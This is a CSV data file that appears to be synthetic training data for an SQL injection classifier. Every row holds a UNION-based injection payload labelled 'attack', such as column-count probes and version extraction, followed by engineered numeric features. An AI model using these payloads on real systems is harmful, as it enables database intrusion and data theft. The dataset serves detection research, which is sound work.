id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000064,attack,union," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",nearest_attack_euclidean,R000021,0.0,76.0,27.0,3.9233075730172433,40.0,3.0,23.0,10.0,0.5263157894736842,0.0394736842105263,0.3026315789473684,0.13157894736842105,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000065,attack,union,"1'   )    )    as umah where 3781  =  3781 union all select null,null,null,null#",nearest_attack_euclidean,R000196,0.7630795252762258,78.16115865497741,23.632231730995482,3.7851311989312793,39.52892692398193,9.0,22.0,7.632231730995482,0.5054511081774133,0.11525826201753389,0.28174241826508284,0.09754821153996988,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,2.632231730995482,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000066,attack,union,"-4152""  )   where 9781  =  9781 union all select 9781,9781,9781,9781,9781--",nearest_attack_euclidean,R000173,0.30061658886630055,75.0,26.095193436597267,4.033376111748163,19.57116061958361,30.857678760832783,14.761547492778142,9.809613126805464,0.2609488082611148,0.41143571681110386,0.1968206332370419,0.13079484169073952,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0951934365972678,-1.3877787807814457e-17,0.0,3.7144196902081967,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000067,attack,union,"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",nearest_attack_euclidean,R000202,0.6790858903127289,77.65036838106475,27.349631618935245,3.9795973558593123,23.048894856805738,30.601473524259013,15.349631618935247,8.650368381064753,0.2973048979857674,0.39357276782806694,0.19784904497139208,0.11127328921477364,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,3.6503683810647534,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000068,attack,union,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",nearest_attack_euclidean,R000177,0.6327016532200007,78.77451314886373,20.245097370227253,3.3940890676487117,14.0,43.01961051909099,8.0,13.754902629772747,0.17785946931931793,0.5459150438295458,0.10163398246818169,0.17459150438295457,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,8.754902629772747,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000069,attack,union," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000016,0.3787775636163462,81.29208734167419,31.58417468334838,4.231179508217047,42.0,4.70791265832581,22.0,12.584174683348378,0.5166715344248245,0.05794647525083105,0.2706374704130033,0.1547445199113412,3.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,5.292087341674189,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000070,attack,union,"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",nearest_attack_euclidean,R000128,1.065419517457397,78.57785067204732,26.0,4.065755357695791,21.683388004035486,32.0,14.894462668011828,10.0,0.27474296185281327,0.40827450256939535,0.18939675352485538,0.12758578205293605,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,4.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000071,attack,union," select * from users where id  =  1 -@<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000103,0.41857686803275873,79.98002900096608,26.0,3.901882845381572,42.640038667954784,2.339990333011304,24.0,11.0,0.5328777866511284,0.02937308625704077,0.30017083000582684,0.13757829708600397,0.0,0.0,3.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000072,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000172,0.5418984857756916,78.78618680072837,22.0,3.686760605768585,46.572373601456746,9.0,14.427626398543257,8.786186800728371,0.591085156585662,0.1142363386552166,0.18318336096636156,0.11149514379275982,0.21381319927162823,0.0,0.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,5.572373601456743,1.0,0.21381319927162823,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000073,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.9539565261486556,81.60506749008943,27.302533745044713,3.9110033389127317,42.30253374504471,3.6974662549552857,25.0,10.605067490089429,0.5183835190785164,0.04537773266265366,0.30639198464194023,0.12984676361688968,0.6050674900894285,1.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.3025337450447143,4.0,0.30253374504471425,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000074,attack,union," select * from users where id  =  1 union select +!<1,version  (    )   -- 1",nearest_attack_euclidean,R000026,0.21170137654222548,76.0,27.283530865568856,3.9335851472018915,40.0,2.7164691344311436,23.0,10.283530865568858,0.5263157894736842,0.03574301492672552,0.3026315789473684,0.1353096166522218,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,7.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000075,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000063,0.2270642779460303,76.62721986224165,25.372780137758355,3.8493478324011305,42.88165958672494,2.3727801377583546,23.372780137758355,8.0,0.559516424169376,0.031006430431119253,0.3050714309254674,0.1044057144740374,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000076,attack,union," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000023,1.4739858670236918,80.44741173712661,28.447411737126618,4.027707379200381,40.0,3.0,23.447411737126615,14.0,0.4972381991535394,0.03729286493651546,0.29143556620620636,0.17403336970373878,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.4474117371266174,0.0,1.0,5.447411737126617,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000077,attack,union," select * from users where id  =  '1' or \<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000082,0.14588701171600388,81.0,32.0,4.250112285986468,42.0,4.0,22.0,13.0,0.5185185185185185,0.04938271604938271,0.2716049382716049,0.16049382716049382,3.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,5.736765784054273,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000078,attack,union," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000071,0.061677423021371754,81.0,26.08454308936873,3.844418755788499,42.0,4.915456910631271,25.0,9.08454308936873,0.5185185185185185,0.06068465321767,0.30864197530864196,0.1121548529551695,0.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000079,attack,union,"-3562""  )   as eghl where 7094  =  7094 union all select 7094,7094,7094,7094#",nearest_attack_euclidean,R000167,0.8117648300473367,78.95497032623685,28.60900593475263,4.1718059866046815,25.0,29.563976260989477,16.0,8.39099406524737,0.31693470729237866,0.37403975339904305,0.20283821266712235,0.10618732664145591,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,3.390994065247369,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000080,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000223,0.7591763403091487,78.86587739682548,16.0,3.0746644726895216,51.492701917460394,1.0,14.0,12.373175479365097,0.6527786154265404,0.01269149867012584,0.1776809813817617,0.15684890452157216,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,-1.3877787807814457e-17,0.0,8.373175479365099,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000081,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000231,0.37070383465523704,82.58070881061684,26.79035440530842,3.9925478405701322,27.096455946915803,29.589075661046824,16.0,9.89517720265421,0.32934087590797484,0.3570703977317596,0.1937942136693809,0.1197945126908847,1.0,0.0,2.8951772026542097,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,4.0,3.8951772026542097,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000082,attack,union," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",nearest_attack_euclidean,R000021,0.020726848123721345,75.96984523772878,27.0,3.9229043458844686,40.0,2.9698452377287783,23.0,10.0,0.5265274018404997,0.03908749164108785,0.3027532560582874,0.13163185046012493,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,5.030154762271222,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000083,attack,union,"1'   )    )    as umah where 3781  =  3781 union all select null,null,null,null#",nearest_attack_euclidean,R000196,0.7683701622530655,78.14840947000748,23.629681894001497,3.785001347804773,39.51872757600598,9.0,22.0,7.629681894001495,0.5054022363016953,0.1152773857949888,0.2817891652766393,0.09753121262667663,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,2.6296818940014948,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000084,attack,union,"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",nearest_attack_euclidean,R000247,0.4879694706570643,79.80289262321028,24.408677869630843,3.9510382996613513,19.0,40.0,10.0,10.802892623210282,0.23809256964541214,0.5012475150429729,0.12531187876074323,0.13534803655087174,0.8028926232102813,0.0,3.0,0.0,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,6.0,4.0,0.8028926232102813,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000085,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000127,1.3900675511360554,78.3044724846355,24.3044724846355,4.009450177690855,21.489535575065368,33.6955275153645,12.271645636523376,10.84776375768225,0.2725233698881696,0.43123340159881973,0.15729974565639468,0.13894348285661595,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.4238818788411254,-1.3877787807814457e-17,0.0,6.423881878841126,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000086,attack,union,"-4317""   )    )    as nxvn where 2566  =  2566 union all select 2566,2566,2566#",nearest_attack_euclidean,R000295,0.7098394900178245,79.26929148936043,27.9228340425583,3.945387055212342,29.308663829766797,19.96062765959363,22.0,8.0,0.36924875875277946,0.2522826881903871,0.2775436055750112,0.10092494748182225,0.0,1.0,0.7307085106395752,0.0,0.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,2.2692914893604246,1.7307085106395754,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000087,attack,union," select * from users where id  =  1 union select +!<@,version  (    )   -- 1",nearest_attack_euclidean,R000044,1.5198689076300582,75.6756100716274,28.973169785117797,4.092736235835891,41.297559713490394,2.0,21.053660429764406,11.324389928372598,0.5458930062035393,0.026429610501183365,0.2779893264938008,0.1496880568014765,0.0,0.0,2.0,0.0,1.3243899283725988,1.0,0.0,1.3512201432548019,-1.3877787807814457e-17,0.0,1.0,7.0,0.0,0.0,1.0,0.0,0.0,1.0,0.6756100716274009,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000088,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,1.1157700370679382,77.61559283295688,22.59610179176078,3.725862678122333,44.61559283295687,9.0,14.0,10.0,0.5745583163630883,0.1160295500827941,0.18049041123990192,0.12892172231421567,0.596101791760782,0.0,2.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,5.403898208239218,3.0,0.596101791760782,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000089,attack,union,-3166'||  (  select 'mtan' from dual where 9420  =  9420 union all select 9420#,nearest_attack_euclidean,R000186,0.719546965471787,79.20364215794736,28.981789210263194,4.334479450328,38.62913726357888,14.574504894368475,16.59271568410528,9.40728431589472,0.4875264373383986,0.18419740698227086,0.20955104784164746,0.11872510783768303,3.0,0.0,0.7963578420526394,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,0.6109264738420825,3.7963578420526396,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0000000000000002,2.0,1.0,1.0,0.7963578420526396,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.79635784205264
SMOTE_000090,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000017,8.429369702178807e-08,77.0,27.0,3.94638244365072,40.0,3.0,23.0,11.0,0.5194805194805194,0.038961038961038946,0.2987012987012987,0.14285714285714285,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000091,attack,union,"-6965'  )   union all select 2857,2857,2857,2857,2857,2857,2857,2857,2857,2857--",nearest_attack_euclidean,R000304,0.837280721072271,77.998814775439,21.5997629550878,3.693684378494762,14.0,42.399051820351204,8.0,13.599762955087801,0.17966943219064233,0.5433293825847967,0.10266824696608134,0.17433293825847967,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,8.599762955087801,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000092,attack,union," select * from users where id  =  1 union select !<@,version  (    )   -- 1",nearest_attack_euclidean,R000105,0.9558558703443504,75.18309659381825,26.81690340618175,3.9075656728702377,40.0,2.1830965938182505,23.0,10.0,0.5320484449556614,0.02901158795591796,0.30592785584950527,0.13301211123891535,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.18309659381825097,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000093,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000139,1.3817534928750839,76.89516377818934,25.0,3.8182566945958443,19.0,33.89516377818934,14.0,10.0,0.24725601488850676,0.4404205978839058,0.18218864254942602,0.13013474467816144,0.5262090554526642,0.0,3.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,4.473790944547336,4.0,0.5262090554526642,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000094,attack,union,"1'||  (  select 'ukfj' where 7133  =  7133 union all select null,null,null#",nearest_attack_euclidean,R000238,0.7951395738394015,76.2313840108043,26.738830406482585,4.1308635800449665,41.98510720864345,9.0,15.492553604321722,9.753723197839138,0.5505660493675469,0.11815292398379354,0.20307846002701077,0.12820256662164872,3.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.7537231978391383,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0000000000000002,2.0,1.0,1.0,0.2462768021608616,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.246276802160861
SMOTE_000095,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000163,0.31383569199889083,78.12382801412677,22.0,3.7980958858823746,45.24765602825356,9.0,15.752343971746447,8.123828014126776,0.5791536691931308,0.11520375655190832,0.20167179188091436,0.10397078237404647,0.8761719858732231,0.0,0.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,4.247656028253554,1.0,0.8761719858732231,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
